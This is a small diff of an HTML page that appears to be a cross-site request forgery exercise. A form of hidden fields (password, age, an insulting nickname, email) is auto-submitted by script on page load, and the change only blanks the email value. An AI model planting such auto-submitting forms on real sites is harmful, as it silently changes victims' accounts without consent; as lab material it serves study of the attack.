@@ -11,7 +11,7 @@
           <input type="hidden" name="user_pw2" value="1212" >
           <input type="hidden" name="age" value="50">
           <input type="hidden" name="nick" value="멍청이">
-          <input type="hidden" name="email" value="hack@kh.com">
+          <input type="hidden" name="email" value="">
           </form>
           <script>
           document.getElementById("hack").submit();
